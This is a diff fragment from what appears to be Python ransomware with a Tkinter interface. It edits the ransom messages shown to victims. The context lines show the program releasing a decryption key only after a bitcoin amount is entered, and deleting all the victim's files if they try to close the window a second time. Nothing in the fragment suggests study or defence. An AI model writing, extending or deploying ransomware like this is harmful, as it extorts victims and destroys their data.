@@ -10,7 +10,7 @@ import random
 def gui_write_key(key):
     if bitcoin_entry.get() >= how_many_bitcoins_do_we_want and bitcoin_entry.get().isdigit():
         encrypter.write_key(key)
-        messagebox.showinfo(title = 'Text File Created', message = "A text file has been created with the key for your files. Enter it into the input field below to get your files back. Thank you for your cooperation.")
+        messagebox.showinfo(title = 'Text File Created', message = "A text file has been created in the next available space on your desktop with the key for your files. Enter it into the input field below to get your files back. Thank you for your cooperation.")
 
 #uses fernet key to decrypt all files in file_paths list
 def gui_decrypt_files(file_paths, fernet, key):
@@ -31,7 +31,7 @@ def gui_decrypt_files(file_paths, fernet, key):
 def on_close():
     global close_counter
     if close_counter == 0:
-        messagebox.showinfo(title = 'Do Not Close This Program', message = 'This is your second and final warning. If you attempt to close the program one more time, your files will be permanently deleted.')
+        messagebox.showinfo(title = 'Do Not Close This Program', message = 'This is your second and final warning. If you attempt to close the program one more time, your files WILL be permanently deleted.')
         close_counter += 1
     elif close_counter == 1:
         encrypter.delete_everything(file_paths)
